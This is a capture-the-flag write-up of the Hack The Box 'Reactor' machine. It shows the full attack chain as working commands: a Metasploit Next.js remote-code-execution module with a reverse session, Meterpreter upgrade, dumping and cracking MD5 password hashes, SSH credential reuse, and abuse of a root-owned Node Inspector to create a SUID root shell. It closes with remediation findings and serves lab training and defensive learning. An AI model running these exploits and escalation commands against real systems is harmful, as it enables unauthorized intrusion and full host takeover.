# Hack The Box — Reactor CTF Write-Up

> **Platform:** Hack The Box  
> **Target:** Reactor  
> **Target IP:** `10.129.65.185`  
> **Difficulty shown during testing:** Easy  
> **Date completed:** 10 July 2026  
> **Result:** User and root flags obtained

## Disclaimer

This write-up documents activity performed inside an authorized Hack The Box lab. The techniques and commands are provided for educational use in systems where explicit permission has been granted.

## Executive Summary

The Reactor machine exposed SSH on port 22 and a Next.js application on port 3000. The web application was vulnerable to an unauthenticated React/Next.js remote-code-execution flaw, which provided an initial shell as the low-privileged `node` user.

Application enumeration revealed a local SQLite database containing MD5 password hashes. The `engineer` account hash was cracked and reused for SSH access, resulting in the user flag. Local enumeration then identified a Node.js Inspector service bound to `127.0.0.1:9229` and running with root privileges. An SSH tunnel exposed the debugger locally, allowing JavaScript evaluation in the root-owned process. This was used to create a temporary SUID copy of Bash and obtain a root shell.

## Attack Chain

```text
Nmap scan
   ↓
Next.js application on TCP/3000
   ↓
Unauthenticated React/Next.js RCE
   ↓
Shell as node
   ↓
SQLite database enumeration
   ↓
Crack engineer MD5 password
   ↓
SSH as engineer → user.txt
   ↓
Discover root-owned Node Inspector on 127.0.0.1:9229
   ↓
SSH local port forwarding
   ↓
Attach Node debugger and execute commands as root
   ↓
SUID Bash → root shell → root.txt
```

---

## 1. Reconnaissance

I began with an aggressive Nmap scan against the target:

```bash
nmap -A 10.129.65.185
```

The scan identified two open TCP ports:

| Port | Service | Details |
|---:|---|---|
| 22 | SSH | OpenSSH 9.6p1 on Ubuntu |
| 3000 | HTTP | Next.js web application |

The HTTP response included headers such as `X-Powered-By: Next.js`, confirming that the service on port 3000 was built with Next.js.

> **Image missing from the source repository:** Nmap scan showing ports 22 and 3000 (`images/01-nmap-scan.png`).

### Key observation

The limited attack surface made the web application on port 3000 the primary initial-access target.

---

## 2. Initial Access — Unauthenticated RCE

The application was tested with the Metasploit module:

```text
multi/http/react2shell_unauth_rce_cve_2025_55182
```

The module was configured as follows:

```text
use multi/http/react2shell_unauth_rce_cve_2025_55182
set RHOSTS 10.129.65.185
set RPORT 3000
set LHOST tun0
set TARGETURI /
check
run
```

The `check` command reported that the target appeared vulnerable. Running the exploit opened a Unix command-shell session, and `whoami` returned:

```text
node
```

> **Image missing from the source repository:** Initial command shell obtained through the web application (`images/02-initial-rce-shell.png`).

### Result

Initial access was obtained as the service account `node`.

---

## 3. Shell Upgrade

The basic command shell was upgraded to a Meterpreter session:

```text
background
sessions -u 1
sessions
sessions -i 2
```

Metasploit successfully created a new `meterpreter x86/linux` session while preserving the original command shell.

> **Image missing from the source repository:** Command shell upgraded to Meterpreter (`images/03-meterpreter-upgrade.png`).

This provided more convenient file-system navigation and file-transfer capabilities.

---

## 4. Application and Credential Enumeration

The application was located in:

```text
/opt/reactor-app
```

Directory enumeration revealed several useful files:

```text
.env
next.config.js
package.json
reactor.db
```

The environment file contained the database location and type:

```text
DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3
```

> **Image missing from the source repository:** Application files and environment configuration (`images/04-application-enumeration.png`).

Because `sqlite3` is an operating-system command rather than a Meterpreter command, I entered a normal shell before opening the database:

```text
meterpreter > shell
```

```bash
cd /opt/reactor-app
sqlite3 reactor.db
```

Inside SQLite, I enumerated the tables and queried the users table:

```sql
.tables
SELECT * FROM users;
```

The database returned two users:

| ID | Username | Password hash | Role | Email |
|---:|---|---|---|---|
| 1 | admin | `a203b22191d744a4e70ada5c101b17b8` | administrator | `admin@reactor.htb` |
| 2 | engineer | `39d97110eafe2a9a68639812cd271e8e` | operator | `engineer@reactor.htb` |

> **Image missing from the source repository:** SQLite users table containing MD5 hashes (`images/05-sqlite-users.png`).

Both hashes were 32 hexadecimal characters and were tested as raw MD5 hashes with Hashcat mode `0`.

---

## 5. Password Cracking

The hashes were placed in a file and tested with the `rockyou.txt` wordlist:

```bash
cat > hashes.txt << 'HASHES'
a203b22191d744a4e70ada5c101b17b8
39d97110eafe2a9a68639812cd271e8e
HASHES

hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 hashes.txt --show
```

The administrator hash was not found in the standard `rockyou.txt` wordlist; Hashcat completed the entire keyspace with the status `Exhausted`.

> **Image missing from the source repository:** Hashcat exhausted the wordlist for the administrator hash (`images/06-admin-hash-exhausted.png`).

The `engineer` hash was successfully recovered as:

```text
reactor1
```

### Important finding

The application used an unsalted MD5 hash and the recovered password was also valid for the system SSH account, demonstrating both weak password storage and password reuse.

---

## 6. SSH Access and User Flag

Using the recovered credentials, I logged in through SSH:

```bash
ssh engineer@10.129.65.185
```

Credential used:

```text
Username: engineer
Password: reactor1
```

After logging in, I located and read the user flag:

```bash
cat ~/user.txt
```

```text
User flag: <REDACTED>
```

The user flag was successfully submitted to Hack The Box.

---

## 7. Privilege-Escalation Enumeration

From the `engineer` SSH session, I reviewed running processes and local listening ports:

```bash
ps aux | grep '[n]ode'
ss -ltnp | grep 9229
```

A service was listening only on the loopback interface:

```text
127.0.0.1:9229
```

Port 9229 is commonly used by the Node.js Inspector. Querying its discovery endpoint confirmed an active debugger for:

```text
/opt/uptime-monitor/worker.js
```

```bash
curl http://127.0.0.1:9229/json/list
```

The response exposed a `webSocketDebuggerUrl`, confirming that the process could be remotely debugged from localhost.

> **Image missing from the source repository:** Local Node.js Inspector discovered on port 9229 (`images/07-node-inspector-local.png`).

Process enumeration showed that this Node.js service was running as root, making the debugger a direct privilege-escalation opportunity.

---

## 8. SSH Local Port Forwarding

Because the Inspector was bound to `127.0.0.1` on the target, I forwarded it to the Kali machine:

```bash
ssh -N -o ExitOnForwardFailure=yes \
  -L 127.0.0.1:9229:127.0.0.1:9229 \
  engineer@10.129.65.185
```

The terminal running this command remained open because the `-N` option creates the tunnel without starting an interactive remote shell.

From a separate Kali terminal, I verified the listener and the Inspector endpoint:

```bash
ss -ltnp | grep 9229
curl http://127.0.0.1:9229/json/list
```

> **Image missing from the source repository:** SSH tunnel and Node Inspector endpoint validation (`images/08-ssh-tunnel-validation.png`).

Chromium's automatic target discovery did not reliably display the remote process, so I used the Node.js command-line debugger instead.

---

## 9. Attaching to the Root-Owned Node Process

I connected to the forwarded Inspector endpoint with:

```bash
node inspect 127.0.0.1:9229
```

After the debugger connected, I entered the evaluation REPL:

```text
repl
```

I then checked the effective user ID of the inspected process:

```javascript
process.getuid()
```

The result was:

```text
0
```

This confirmed that commands evaluated inside the debugger would run as root.

> **Image missing from the source repository:** Node debugger connected to a process running with UID 0 (`images/09-node-debugger-root-context.png`).

### Loading `child_process`

The target used an ES-module context, so the usual `require()` function and `process.mainModule` were unavailable. The target was running Node.js v20.20.2, which supported `process.getBuiltinModule()`.

I verified root command execution with:

```javascript
process.getBuiltinModule('child_process').execSync('id').toString()
```

The command returned:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

## 10. Root Shell

To obtain an interactive root shell, I created a temporary SUID copy of Bash:

```javascript
process.getBuiltinModule('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash').toString()
```

The empty string returned by `execSync()` indicated that the command completed without producing standard output.

> **Image missing from the source repository:** Successful command execution in the root-owned Node process (`images/10-root-command-execution.png`).

From the normal `engineer` SSH session, I verified the file permissions:

```bash
ls -l /tmp/rootbash
```

Expected SUID permission pattern:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

I then preserved the effective root privilege with Bash's `-p` option:

```bash
/tmp/rootbash -p
id
whoami
```

The resulting shell had an effective user ID of root. I then read the root flag:

```bash
cat /root/root.txt
```

```text
Root flag: <REDACTED>
```

The root flag was successfully submitted to Hack The Box.

### Cleanup

After completing the lab, the temporary SUID binary should be removed:

```bash
rm -f /tmp/rootbash
```

---

## 11. Findings

### 11.1 Unauthenticated remote code execution

The public Next.js service accepted an exploit path that resulted in unauthenticated command execution as the `node` service account.

**Impact:** Initial compromise of the host and access to application data.

**Recommendation:** Patch the affected framework/runtime, remove vulnerable functionality, restrict external access, and deploy application-layer monitoring for exploit attempts.

### 11.2 Weak password storage

Passwords were stored as unsalted MD5 hashes in a local SQLite database.

**Impact:** Passwords can be recovered rapidly using dictionary and rule-based attacks.

**Recommendation:** Use a modern password-hashing function such as Argon2id, scrypt, or bcrypt with an appropriate work factor and a unique salt per password.

### 11.3 Password reuse

The recovered application password for `engineer` was accepted by the operating-system SSH service.

**Impact:** An application database compromise directly enabled system-level access.

**Recommendation:** Prohibit credential reuse between applications and operating-system accounts. Prefer SSH keys and disable password authentication where practical.

### 11.4 Root-owned Node Inspector

A Node.js Inspector endpoint was enabled on a process running as root.

**Impact:** Anyone who can reach the debugger can execute arbitrary JavaScript and operating-system commands with root privileges.

**Recommendation:** Disable the Inspector in production. If debugging is temporarily required, run the application as an unprivileged dedicated account and strictly restrict access to the debugger.

### 11.5 Excessive service privileges

The uptime-monitor worker did not require root privileges but was executed as root.

**Impact:** A compromise of the service or its debugging interface becomes a complete system compromise.

**Recommendation:** Apply the principle of least privilege and use service hardening controls such as a dedicated user, restricted file permissions, systemd sandboxing, and limited Linux capabilities.

---

## 12. Lessons Learned

1. A small exposed attack surface does not imply a low-risk target; one vulnerable web service can provide full initial access.
2. Application configuration files and local databases are high-value post-exploitation targets.
3. Unsalted MD5 is unsuitable for password storage, especially when users reuse passwords across services.
4. Services bound to localhost are not automatically safe after an attacker obtains SSH or shell access.
5. Debug interfaces should never be enabled on privileged production processes.
6. When a graphical debugger is unreliable, the Node.js CLI debugger can connect directly to an Inspector endpoint.
7. JavaScript environments are case-sensitive, and ES-module contexts may require alternatives to the traditional `require()` function.

---

## 13. Command Reference

```bash
# Reconnaissance
nmap -A 10.129.65.185

# SQLite enumeration
sqlite3 /opt/reactor-app/reactor.db
.tables
SELECT * FROM users;

# Hash cracking
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 hashes.txt --show

# SSH access
ssh engineer@10.129.65.185

# Inspector discovery
ss -ltnp | grep 9229
curl http://127.0.0.1:9229/json/list

# Local port forwarding
ssh -N -o ExitOnForwardFailure=yes \
  -L 127.0.0.1:9229:127.0.0.1:9229 \
  engineer@10.129.65.185

# Attach debugger
node inspect 127.0.0.1:9229
```

Debugger REPL commands:

```javascript
process.getuid()
process.getBuiltinModule('child_process').execSync('id').toString()
process.getBuiltinModule('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash').toString()
```

Root-shell commands:

```bash
/tmp/rootbash -p
id
whoami
cat /root/root.txt
rm -f /tmp/rootbash
```

---

## Conclusion

The Reactor machine was compromised through an unauthenticated web-application RCE, followed by credential extraction from SQLite and password reuse for SSH access. Root privileges were obtained by attaching to a root-owned Node.js Inspector service through SSH local port forwarding. The complete path demonstrates how multiple weaknesses—an exposed RCE, weak password hashing, password reuse, and an unsafe privileged debugger—can be chained into a full system compromise.
